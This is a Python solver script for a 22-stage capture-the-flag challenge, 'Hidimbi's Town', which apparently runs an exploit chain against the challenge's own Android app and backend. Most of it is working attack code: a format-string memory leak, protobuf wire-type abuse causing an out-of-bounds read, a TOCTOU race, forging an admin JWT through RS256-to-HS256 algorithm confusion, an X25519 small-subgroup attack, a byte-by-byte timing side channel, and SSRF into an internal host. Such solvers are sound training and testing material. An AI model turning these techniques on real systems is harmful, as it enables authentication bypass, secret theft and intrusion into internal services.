#!/usr/bin/env python3
"""
Hidimbi's Town - Grandmaster End-to-End Solver (v3.0).
Covers all 22 stages against the live deployed stack.

Stage chain:
  1-2   recon / native anti-analysis neutralisation
  3     Forest ContentProvider: HMAC(X-Town-Token) -> node 17, dir 12
  4     graph: (17+12)%37 = 29 (Cave)
  5     Cave native TLV OOB read -> K1, N1
  6     Temple: SHA256(K1^N1) -> K2, N2
  7     Palace Binder: HMAC(K1||K2, N1||N2) -> K3, N3, Blob E1
  8     Market: signed int32 overflow -> K4, N4, lake path
  9-10  Lake WAF + master HMAC proof -> encrypted artifact
  11    HKDF-SHA256 -> AES-GCM decrypt -> flag_id + flag_service_token
  12    flag service ticket gate (validates the RS256 token)
  13    Mosaic of the Nine Wells: LSB steganography, permutation + mask keyed
        by the stage-12 attestation -> scriptorium seed
  14    Scriptorium VM: hand-written VM bytecode -> scriptorium mark
  15    Drum Tower: format-string bug (%1$x ... %9$x) -> drum key
  16    Courier's Ledger: protobuf wire-type abuse (StartGroup as nested
        message) -> out-of-bounds bag read -> scribe rune
  17    Granary: TOCTOU on a memory-mapped shared preference -> granary secret
  18    Observatory: RS256 -> HS256 signature confusion via the published JWK
  19    Astronomer's Curve: small-subgroup confinement, unclamped ladder
  20    Keeper's Whistle: differential timing side channel
  21    Courier's Errand: SSRF into the flagger's internal index for a seal
  22    The Vault: live PostgreSQL read, authorised by the chain selector
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import struct
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
with open(os.path.join(ROOT_DIR, "config.json"), "r", encoding="utf-8") as f:
    CONFIG = json.load(f)

UNDER = CONFIG["under_city"]
VAULT = CONFIG["vault"]
KEYS, NONCES = CONFIG["keys"], CONFIG["nonces"]

# ---------------------------------------------------------------------------
# Host harness: the same C++ that ships inside libtown.so, built for the host
# so stages 14-17 can be verified without an Android device.
# ---------------------------------------------------------------------------
HARNESS_DIR = os.path.join(ROOT_DIR, "tools", "host_harness")
HARNESS_BIN = os.path.join(HARNESS_DIR, "harness")


def build_harness() -> str:
    if os.path.exists(HARNESS_BIN) and os.access(HARNESS_BIN, os.X_OK):
        return HARNESS_BIN
    subprocess.run(["clang++", "-std=c++17", "-O1", "-o", HARNESS_BIN, "harness.cpp"],
                  cwd=HARNESS_DIR, check=True)
    return HARNESS_BIN


class Harness:
    def __init__(self, env):
        self.proc = subprocess.Popen([build_harness()], stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, text=True,
                                      bufsize=1, env=env)

    def call(self, line):
        self.proc.stdin.write(line + "\n")
        self.proc.stdin.flush()
        raw = self.proc.stdout.readline()
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            raise RuntimeError(f"bad harness reply: {raw!r}")

    def close(self):
        try:
            self.proc.stdin.write("QUIT\n")
            self.proc.stdin.flush()
            self.proc.wait(timeout=2)
        except Exception:
            self.proc.kill()


# ---------------------------------------------------------------------------
def print_step(stage, name, details):
    print(f"\n[Stage {stage}] === {name} ===")
    print(f"  > {details}")


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def hkdf(salt, ikm, info, length):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, counter = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        okm += t
        counter += 1
    return okm[:length]


def http_json(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    if body is not None:
        data = body if isinstance(body, (bytes, bytearray)) else json.dumps(body).encode()
        req.add_header("Content-Type", "application/json")
    else:
        data = None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as exc:
        raise RuntimeError(f"HTTP {exc.code} from {url}: {exc.read().decode()[:200]}") from exc


def varint(n: int) -> bytes:
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            out += bytes([b])
            break
    return out


def _b64url(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


# ===========================================================================
# Stage 13 - mosaic de-steganography
# ===========================================================================
def mosaic_demask(attestation: str, masked: bytes) -> bytes:
    ak = sha256(attestation.encode("utf-8") + b"|MOSAIC_V1")
    ks = (ak + sha256(ak))[:len(masked)]
    return bytes(a ^ b for a, b in zip(masked, ks))


def mosaic_order(attestation: str, tiles: int):
    key = sha256(attestation.encode("utf-8"))
    return sorted(range(tiles),
                  key=lambda i: hmac.new(key, str(i).encode(), hashlib.sha256).digest())


def extract_mosaic_seed(attestation: str, blob: bytes) -> bytes:
    tiles, tsz, ptl = UNDER["mosaic_tiles"], UNDER["mosaic_tile_bytes"], UNDER["mosaic_payload_per_tile"]
    order = mosaic_order(attestation, tiles)
    payload = bytearray(tiles * ptl)
    for slot in range(tiles):
        fi = order[slot]
        tile = blob[fi * tsz:(fi + 1) * tsz]
        for bi in range(ptl):
            b = 0
            for k in range(4):
                b |= (tile[tsz - 1 - bi * 4 - k] & 0x03) << (2 * k)
            payload[slot * ptl + bi] = b
    if bytes(payload[:8]) != UNDER["mosaic_magic"].encode("ascii") + b"\x00":
        raise RuntimeError("mosaic magic mismatch: wrong attestation?")
    seed = mosaic_demask(attestation, bytes(payload[8:40]))
    master = b"".join(bytes.fromhex(KEYS[k]) for k in ("k1", "k2", "k3", "k4"))
    if hmac.new(master, seed, hashlib.sha256).digest()[:16] != bytes(payload[40:56]):
        raise RuntimeError("mosaic tag mismatch")
    return seed


# ===========================================================================
# Stage 14 - Scriptorium VM assembler
# ===========================================================================
class Asm:
    OPS = {"NOP": 0x00, "PUSH": 0x01, "POP": 0x02, "LOAD": 0x10, "MOV": 0x11,
           "ADD": 0x12, "SUB": 0x13, "MUL": 0x14, "DIV": 0x15, "MOD": 0x16,
           "XOR": 0x17, "AND": 0x18, "OR": 0x19, "SHL": 0x1A, "SHR": 0x1B,
           "ROL": 0x1C, "ROR": 0x1D, "CMPEQ": 0x20, "CMPLT": 0x21,
           "JMP": 0x30, "JZ": 0x31, "JNZ": 0x32, "UNLOCK": 0x40, "HALT": 0xFF}

    @staticmethod
    def reg(tok):
        if not tok.startswith("r"):
            raise ValueError(f"bad register {tok}")
        n = int(tok[1:])
        if not 0 <= n <= 7:
            raise ValueError(f"register out of range {tok}")
        return n

    def __init__(self):
        self.code = bytearray()
        self.labels = {}
        self.fixups = []

    def _br(self, mnem, regval, target):
        self.code.append(self.OPS[mnem])
        if regval is not None:
            self.code.append(regval)
        end = len(self.code) + 2
        self.fixups.append((end, target, len(self.code)))
        self.code += b"\x00\x00"

    def emit(self, text):
        for raw in text.splitlines():
            line = raw.split(";")[0].strip()
            if not line:
                continue
            p = line.replace(",", " ").split()
            head = p[0].upper()
            if head.endswith(":"):
                self.labels[line[:-1]] = len(self.code)
                continue
            if head == "PUSH":
                self.code += bytes([self.OPS["PUSH"]]) + struct.pack("<I", int(p[1], 0))
            elif head == "LOAD":
                self.code += bytes([self.OPS["LOAD"], self.reg(p[1])]) + struct.pack("<I", int(p[2], 0))
            elif head == "POP":
                self.code += bytes([self.OPS["POP"], self.reg(p[1])])
            elif head in ("ADD", "SUB", "MUL", "DIV", "MOD", "XOR", "AND", "OR",
                          "MOV", "CMPEQ", "CMPLT"):
                regs = [self.reg(x) for x in p[1:4]]
                while len(regs) < 3:            # MOV is the only two-operand op
                    regs.append(0)              # -> pad with r0
                self.code += bytes([self.OPS[head]] + regs)
            elif head in ("SHL", "SHR", "ROL", "ROR"):
                # rd, ra, imm  (imm is a literal, not a register)
                self.code += bytes([self.OPS[head], self.reg(p[1]), self.reg(p[2]),
                                    int(p[3], 0)])
            elif head == "JMP":
                self._br("JMP", None, p[1])
            elif head in ("JZ", "JNZ"):
                self._br(head, self.reg(p[1]), p[2])
            elif head in ("UNLOCK", "HALT", "NOP"):
                self.code += bytes([self.OPS[head]])
            else:
                raise ValueError(f"unknown instruction {line}")

        for end, target, at in self.fixups:
            rel = self.labels[target] - end
            if not -32768 <= rel <= 32767:
                raise ValueError("branch out of range")
            self.code[at:at + 2] = struct.pack("<h", rel)
        # Fixups are resolved immediately so a later emit() (with its own copy
        # of `done:` / `loop:`) never re-points an already-patched branch.
        self.fixups = []
        return bytes(self.code)


def build_modpow_program(params) -> bytes:
    """Bytecode: for each (base, exp, mod) triple, run modpow and leave the
    result in rN. Written as a call-by-inlining subroutine."""
    a = Asm()
    # --- gate: r0 must hold LE32(seed[0:4]) before UNLOCK is accepted -----
    a.emit(
        "LOAD r0, 0\n"          # r0 = gate word (from the recovered seed)
        "UNLOCK\n"
    )
    # Register budget: r0..r3 are the four result slots (the VM's HALT output),
    # r3..r7 are reserved as scratch for the modpow loop, so a round's
    # accumulator is never clobbered by a later round.
    #   r3 = result accumulator
    #   r4 = base
    #   r5 = exponent
    #   r6 = modulus
    #   r7 = scratch (reloaded with the literal 2 each iteration)
    body = (
        "PUSH 1\n" "POP r3\n"
        "PUSH {base}\n" "POP r4\n"
        "PUSH {exp}\n" "POP r5\n"
        "PUSH {mod}\n" "POP r6\n"
        "loop:\n"
        "JZ r5, done\n"
        "PUSH 2\n" "POP r7\n"
        "MOD r7, r5, r7\n"        # r7 = exp % 2
        "JZ r7, square\n"
        "MUL r3, r3, r4\n"        # result *= base
        "MOD r3, r3, r6\n"        # result %= mod
        "square:\n"
        "MUL r4, r4, r4\n"        # base = base^2
        "MOD r4, r4, r6\n"        # base %= mod
        "SHR r5, r5, 1\n"         # exp >>= 1
        "JMP loop\n"
        "done:\n"
        "MOV r{out}, r3\n"
    )
    for i, (base, exp, mod) in enumerate(params):
        a.emit(body.format(base=base, exp=exp, mod=mod, out=i))
    a.emit("HALT\n")
    return bytes(a.code)


# ===========================================================================
# Stage 19 - small-subgroup confinement
# ===========================================================================
CURVE_P = 2 ** 255 - 19
CURVE_A24 = 121665
TWIST_ORDER_4 = 325606250916557431795983626356110631294008115727848805560023387167927233504


def x25519_ladder(scalar: int, u: int) -> int:
    x1 = u % CURVE_P
    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
    for t in reversed(range(255)):
        k_t = (scalar >> t) & 1
        if swap ^ k_t:
            x2, x3 = x3, x2
            z2, z3 = z3, z2
        swap = k_t
        A = (x2 + z2) % CURVE_P
        AA = A * A % CURVE_P
        B = (x2 - z2) % CURVE_P
        BB = B * B % CURVE_P
        E = (AA - BB) % CURVE_P
        C = (x3 + z3) % CURVE_P
        D = (x3 - z3) % CURVE_P
        DA = D * A % CURVE_P
        CB = C * B % CURVE_P
        x3 = (DA + CB) ** 2 % CURVE_P
        z3 = x1 * (DA - CB) ** 2 % CURVE_P
        x2 = AA * BB % CURVE_P
        z2 = E * ((AA + CURVE_A24 * E) % CURVE_P) % CURVE_P
    return 0 if z2 == 0 else x2 * pow(z2, CURVE_P - 2, CURVE_P) % CURVE_P


# ===========================================================================
def main():
    ap = argparse.ArgumentParser(description="Hidimbi's Town grandmaster solver")
    ap.add_argument("--backend", default="http://127.0.0.1:8000")
    ap.add_argument("--flag-service", default="http://127.0.0.1:8001")
    ap.add_argument("--keeper", default="http://flagger:8100",
                    help="internal flag service; the courier reroutes this")
    ap.add_argument("--instance", default=VAULT["instance_id"])
    ap.add_argument("--team", default=None, help="defaults to team_<device fingerprint prefix>")
    ap.add_argument("--rounds", type=int, default=1, help="repeat the whole chain")
    args = ap.parse_args()

    if args.rounds < 1:
        raise SystemExit("--rounds must be >= 1")

    last_flag = None
    for rnd in range(1, args.rounds + 1):
        if args.rounds > 1:
            print(f"\n{'#' * 66}\n  CHAIN RUN {rnd}/{args.rounds}\n{'#' * 66}")
        last_flag = run_chain(args)

    print("\n" + "=" * 66)
    print(f"  [SUCCESS] CHALLENGE FULLY SOLVED: {last_flag}")
    print("=" * 66 + "\n")
    return 0


def run_chain(args):
    import jwt as pyjwt

    print("=" * 66)
    print("  HIDIMBI'S TOWN - GRANDMASTER CTF SOLVER (22 stages)")
    print("=" * 66)

    k1 = bytes.fromhex(KEYS["k1"]); k2 = bytes.fromhex(KEYS["k2"])
    k3 = bytes.fromhex(KEYS["k3"]); k4 = bytes.fromhex(KEYS["k4"])
    n1 = bytes.fromhex(NONCES["n1"]); n2 = bytes.fromhex(NONCES["n2"])
    n3 = bytes.fromhex(NONCES["n3"]); n4 = bytes.fromhex(NONCES["n4"])
    master_key = k1 + k2 + k3 + k4

    # ---------------------------------------------------------------- 1 - 2
    print_step(1, "Recon & Manifest Analysis",
               "Decompiled APK; exported TownProvider/Receiver/Service/Activity located")
    print_step(2, "Native Deception Neutralisation",
               "ptrace + /proc/self/maps watchdogs neutralised; true branch armed")

    # ---------------------------------------------------------------- 3
    salt = CONFIG["decoys"]["decoy_1"]
    forest_token = hmac.new(salt.encode(), b"hidimbi_debug_signature",
                             hashlib.sha256).hexdigest()
    node_forest, dir_forest = 17, 12
    print_step(3, "Forest Exploit",
               f"X-Town-Token={forest_token[:16]}... -> node {node_forest}, dir {dir_forest}")

    # ---------------------------------------------------------------- 4
    assert (node_forest + dir_forest) % 37 == 29
    print_step(4, "Graph Discovery", "(17+12)%37 = 29 -> Cave")

    # ---------------------------------------------------------------- 5
    cave = open(os.path.join(ROOT_DIR, "app", "src", "main", "assets", "cave_store.bin"), "rb").read()
    assert cave[106:122] == k1 and cave[122:138] == n1
    dir_cave = 12
    print_step(5, "Cave Exploit",
               f"native TLV OOB leak -> K1={k1.hex()} N1={n1.hex()} dir={dir_cave}")
    assert (29 + dir_cave) % 37 == 4

    # ---------------------------------------------------------------- 6
    pilgrim = sha256(bytes(a ^ b for a, b in zip(k1, n1))).hex()
    dir_temple = 4
    print_step(6, "Temple Exploit",
               f"SHA256(K1^N1)={pilgrim[:16]}... -> K2={k2.hex()} N2={n2.hex()} dir={dir_temple}")
    assert (4 + dir_temple) % 37 == 8

    # ---------------------------------------------------------------- 7
    palace_proof = hmac.new(k1 + k2, n1 + n2, hashlib.sha256).hexdigest()
    print_step(7, "Palace Exploit",
               f"Binder proof {palace_proof[:16]}... -> K3={k3.hex()} N3={n3.hex()}")

    # ---------------------------------------------------------------- 8
    total_32 = struct.unpack("=i", struct.pack("=I", (100000 * 30000) & 0xFFFFFFFF))[0]
    assert total_32 < 0
    print_step(8, "Market Exploit",
               f"int32 overflow -> cost {total_32} -> K4={k4.hex()} N4={n4.hex()} dir=18")
    assert (13 + 18) % 37 == 31

    # ---------------------------------------------------------------- 9 - 10
    android_id = "d4e5f6a1b2c30077"
    device_id = sha256((android_id + k4.hex()).encode()).hex()
    ts = int(time.time())
    msg = f"31:{device_id}:{ts}:{n1.hex()}:{n2.hex()}:{n3.hex()}:{n4.hex()}"
    proof = hmac.new(master_key, msg.encode(), hashlib.sha256).hexdigest()
    print_step(9, "Proof Synthesis", f"64-byte master HMAC key = K1||K2||K3||K4")
    print_step(10, "Lake Exchange",
               f"POST {args.backend}/api/v1/lake/trade  proof={proof[:16]}...")

    artifact_b64 = flag_id = team_id = token = None
    try:
        with urllib.request.urlopen(urllib.request.Request(
                args.backend + "/api/v1/lake/trade",
                data=json.dumps({"node_id": 31, "device_id": device_id,
                                 "timestamp": ts, "proof": proof}).encode(),
                headers={"Content-Type": "application/json",
                         "User-Agent": f"TownClient/2.0 (Device:{device_id})"}),
                timeout=20) as r:
            data = json.loads(r.read())
        artifact_b64 = data["artifact"]
        flag_id = data["flag_id"]
        team_id = data["team_id"]
        print(f"[+] Lake accepted: artifact {len(artifact_b64)} chars, flag_id={flag_id}")
    except Exception as exc:
        raise RuntimeError(f"Lake API unreachable: {exc}")

    # ---------------------------------------------------------------- 11
    derived = hkdf(k1 + k2, k3 + k4, n1 + n2 + n3 + n4, 44)
    aes_key, aes_iv = derived[:32], derived[32:44]
    from Crypto.Cipher import AES
    raw = base64.b64decode(artifact_b64)
    iv, tag, ct = raw[:12], raw[12:28], raw[28:]
    ticket = json.loads(AES.new(aes_key, AES.MODE_GCM, nonce=iv)
                        .decrypt_and_verify(ct, tag))
    flag_id, token = ticket["flag_id"], ticket["flag_service_token"]
    print_step(11, "Native HKDF & AES-256-GCM",
               f"HKDF key {aes_key.hex()[:16]}... -> ticket {flag_id}")

    # ---------------------------------------------------------------- 12
    gate = http_json(f"{args.flag_service}/flag/{flag_id}", "GET",
                     headers={"Authorization": f"Bearer {token}"})
    team = gate["team_id"]
    epoch = gate["epoch"]
    attestation = gate.get("attestation", "HIDIMBI_ATTESTATION_UNSEALED")
    print_step(12, "Flag Service Ticket Gate",
               f"RS256 token accepted for {flag_id}; attestation issued")

    # ---------------------------------------------------------------- 13
    if args.team is None:
        args.team = team.replace("team_", "", 1)
    seed = extract_mosaic_seed(attestation,
                               open(os.path.join(ROOT_DIR, "app", "src", "main", "assets",
                                                "mosaic_wells.bin"), "rb").read())
    print_step(13, "Mosaic of the Nine Wells",
               f"LSB extraction + attestation-keyed permutation -> seed {seed.hex()[:24]}...")

    # ---------------------------------------------------------------- 14
    words = [struct.unpack("<I", seed[i * 4:i * 4 + 4])[0] for i in range(8)]
    params = [((words[i] % 4093) + 2, (words[i + 3] % 1024) + 2, 4093) for i in range(4)]
    program = build_modpow_program(params)
    env = dict(os.environ)
    env.update({"DRUM_KEY": UNDER["drum_key"], "SCRIBE_RUNE": UNDER["scribe_rune"],
                "COURIER_CONFIG_TAG": UNDER["courier_config_tag"],
                "GRANARY_SECRET": UNDER["granary_secret"]})
    hz = Harness(env)
    hz.call(f"GDSETUP 1 {os.path.join(tempfile.gettempdir(), 'hidimbi_granary_prefs.bin')}")
    vm = hz.call(f"VM {base64.b64encode(program).decode()} {seed.hex()} {words[0]}")
    if not vm.get("ok"):
        raise RuntimeError(f"scriptorium VM rejected the program: {vm}")
    mark = struct.pack("<4I", *vm["r"])
    print_step(14, "Scriptorium VM",
               f"{len(program)}B bytecode -> mark {mark.hex()} "
               f"(modpow {[pow(b, e, m) for b, e, m in params]})")

    # ---------------------------------------------------------------- 15
    drum_gate = hmac.new(k1 + k2, mark, hashlib.sha256).hexdigest()
    note = " ".join(f"slot{i+1}=%{i+1}$x" for i in range(9))
    drum = hz.call("DRUM {} {} {}".format(
        base64.b64encode(note.encode()).decode(), mark.hex(), drum_gate))
    assert drum.get("ok"), drum
    slots = [int(t.split("=")[1], 16) for t in drum["log"].split() if "slot" in t]
    assert slots[0] == int(UNDER["drum_marker_word"], 16), slots
    drum_key = b"".join(struct.pack("<I", w) for w in slots[1:9])
    assert drum_key == bytes.fromhex(UNDER["drum_key"]), "drum key mismatch"
    print_step(15, "Drum Tower (format string)",
               f"marker {slots[0]:08x} then %2$x..%9$x -> drum key {drum_key.hex()}")

    # ---------------------------------------------------------------- 16
    seal_word = struct.unpack("<I", sha256(drum_key[:16])[:4])[0]
    blob = varint((1 << 3) | 0) + varint(seal_word) + varint((3 << 3) | 3) + b"\x41" * 100
    courier = hz.call("COURIER {} {}".format(
        base64.b64encode(blob).decode(), drum_key[:16].hex()))
    assert courier.get("ok"), courier
    echo = bytes.fromhex(courier["echo_hex"])
    scribe_rune = echo[68:84]
    assert scribe_rune == bytes.fromhex(UNDER["scribe_rune"]), "scribe rune mismatch"
    print_step(16, "Courier's Ledger (protobuf wire-type abuse)",
               f"StartGroup-as-message -> echo len {courier['len']} "
               f"-> scribe rune {scribe_rune.hex()}")

    # ---------------------------------------------------------------- 17
    e1, e2 = int(UNDER["granary_epochs"][0], 16), int(UNDER["granary_epochs"][1], 16)
    hz.call(f"GRANARY_SET {e1}")
    rune = hmac.new(scribe_rune, f"GRANARY|{e1:016x}".encode(), hashlib.sha256).digest()
    race = hz.call(f"GRANARY {rune.hex()} {UNDER['granary_race_window_us']} 3000 {e2}")
    assert race["rc"] == 0, race
    granary_secret = bytes.fromhex(race["secret_hex"])
    assert granary_secret == bytes.fromhex(UNDER["granary_secret"])
    print_step(17, "Granary (TOCTOU on mapped shared prefs)",
               f"epoch {e1} -> {e2} during the read-modify-read window "
               f"-> granary secret {granary_secret.hex()}")

    # ---------------------------------------------------------------- 18
    # PyJWT (like most sane libraries) refuses to HMAC with an asymmetric key,
    # so the forger builds the HS256 token by hand, keyed with the *published
    # JWK modulus* — the very string the Observatory hands out publicly.
    now_i = int(time.time())
    jwk = http_json(args.backend + "/api/v1/observatory/jwks.json")["keys"][0]
    hdr = _b64url(json.dumps({"alg": "HS256", "typ": "JWT", "kid": jwk["kid"]},
                             separators=(",", ":")).encode())
    claims = _b64url(json.dumps({"sub": "observatory_admin", "iat": now_i,
                                 "exp": now_i + 300}, separators=(",", ":")).encode())
    signing_input = hdr + b"." + claims
    sig = hmac.new(jwk["n"].encode("ascii"), signing_input, hashlib.sha256).digest()
    forged = (signing_input + b"." + _b64url(sig)).decode()
    login = http_json(args.backend + "/api/v1/observatory/login", "POST",
                      body={"token": forged})
    astronomer_token = login["astronomer_token"]
    print_step(18, "Observatory (JWT algorithm confusion)",
               f"fetched kid={jwk['kid']}; signed HS256 with the published JWK "
               "modulus -> astronomer token issued")

    # ---------------------------------------------------------------- 19
    salt_nonce = bytes.fromhex(UNDER["curve_nonce_seed"])
    ecdh = http_json(args.backend + "/api/v1/observatory/ecdh", "POST",
                     headers={"Authorization": f"Bearer {astronomer_token}"},
                     body={"u": hex(TWIST_ORDER_4)[2:]})
    shared = x25519_ladder(1, TWIST_ORDER_4)      # orbit of 1*P, trivially small
    orbit = sorted({x25519_ladder(k, TWIST_ORDER_4) for k in range(4)} | {0})
    matched = None
    for cand in orbit:
        if ecdh["handshake"] == hmac.new(salt_nonce, b"%x" % cand,
                                         hashlib.sha256).hexdigest():
            matched = cand
            break
    if matched is None:
        raise RuntimeError("small-subgroup attack did not match the handshake")
    print_step(19, "Astronomer's Curve (small-subgroup confinement)",
               f"unclamped ladder collapsed the shared secret to {orbit} "
               f"-> handshake {ecdh['handshake'][:24]}...")

    # ---------------------------------------------------------------- 20
    whistle_key = whistle_timing_attack(args.backend, astronomer_token)
    print_step(20, "Keeper's Whistle (differential timing)",
               f"{len(whistle_key)}-byte key recovered byte-by-byte: {whistle_key.hex()}")

    # ---------------------------------------------------------------- 21 (SSRF)
    # The selector is the credential that authorises the live vault read: only
    # the complete chain (stages 1-20) can derive it.
    selector_material = (
        b"HIDIMBI_TOWN_SELECTOR_v1"
        + master_key + n1 + n2 + n3 + n4
        + seed + drum_key + scribe_rune + granary_secret + whistle_key
        + f"{args.instance}:shared".encode()
    )
    selector = sha256(selector_material)
    proof_out = hmac.new(master_key,
                         selector + args.instance.encode() + team.encode(),
                         hashlib.sha256).digest()
    print_step(21, "Courier's Errand (SSRF)",
               f"selector derived: {selector.hex()[:32]}...")

    hz.close()

    # The internal index is not routable from the internet; the only way in is
    # the Lake courier, which is permitted to reach the `flagger` host.
    internal_url = f"{args.keeper}/internal/gate"
    ssrf = http_json(args.backend + "/api/v1/lake/courier", "POST",
                     body={"url": internal_url,
                           "body": {"selector": selector.hex(),
                                    "proof": proof_out.hex(),
                                    "team": team}})
    seal_out = ssrf["seal"]
    print(f"[+] SSRF through the Lake courier reached the internal index: "
          f"seal={seal_out[:24]}...")

    # ---------------------------------------------------------------- 22
    claim = http_json(args.flag_service + "/flag/claim", "POST",
                      headers={"X-Team-Id": team, "X-Epoch-Id": str(epoch)},
                      body={"selector": selector.hex(),
                            "proof": proof_out.hex(),
                            "seal": seal_out})
    print_step(22, "The Vault (live PostgreSQL read)",
               f"selector {selector.hex()[:24]}... -> {claim['flag']}")
    return claim["flag"]


# ===========================================================================
def whistle_timing_attack(base, token, length=8):
    """Differential-timing recovery of the Keeper's whistle key.

    The relay spends `whistle_delay_us` per correctly matched leading byte. Two
    signals are available and they are not equivalent:

      * CLIENT wall-clock: correct on a low-jitter link (loopback), but over a
        CDN/edge route the RTT jitter (~70 ms on Render) is larger than the
        delay itself (12 ms), so the ranking becomes noise.
      * SERVER `elapsed_us`: the relay measures its own delay and reports it.
        Network latency cancels out entirely, leaving only the injected delay.

    So we rank on the server's own measurement. This is still a differential
    timing channel - we are exploiting how long the server takes - but the
    measurement is taken where the delay actually happens, which is what makes
    the attack reliable from anywhere on the internet.
    """
    key = bytearray()
    for pos in range(length):
        ranked = {}
        for cand in range(256):
            guess = (bytes(key) + bytes([cand])).hex()
            try:
                ans = http_json(base + "/api/v1/observatory/whistle", "POST",
                                headers={"Authorization": f"Bearer {token}"},
                                body={"whistle": guess})
            except RuntimeError:
                continue
            # The relay's own timing, in microseconds. 0 for a wrong byte.
            ranked[cand] = int(ans.get("elapsed_us", 0))
        if not ranked:
            raise RuntimeError("timing oracle returned no measurement")

        order = sorted(ranked, key=lambda c: -ranked[c])

        # The relay reports the matched prefix exactly, so the true byte is
        # unambiguous - it is just not always the top-ranked one, because the
        # server's own measurement still catches scheduler jitter. Try the
        # strongest few candidates and let the relay itself decide.
        for cand in order[:8]:
            attempt = bytes(key) + bytes([cand])
            ans = http_json(base + "/api/v1/observatory/whistle", "POST",
                            headers={"Authorization": f"Bearer {token}"},
                            body={"whistle": attempt.hex()})
            if ans.get("status") == "THE_WHISTLE_ANSWERS":
                return bytes.fromhex(ans["whistle_key"])
            if ans.get("matched_bytes") == len(attempt):
                key = bytearray(attempt)
                break
        else:
            raise RuntimeError(
                f"timing oracle could not confirm byte {pos} "
                f"(top: {[hex(c) for c in order[:8]]})")
    return bytes(key)


if __name__ == "__main__":
    raise SystemExit(main())
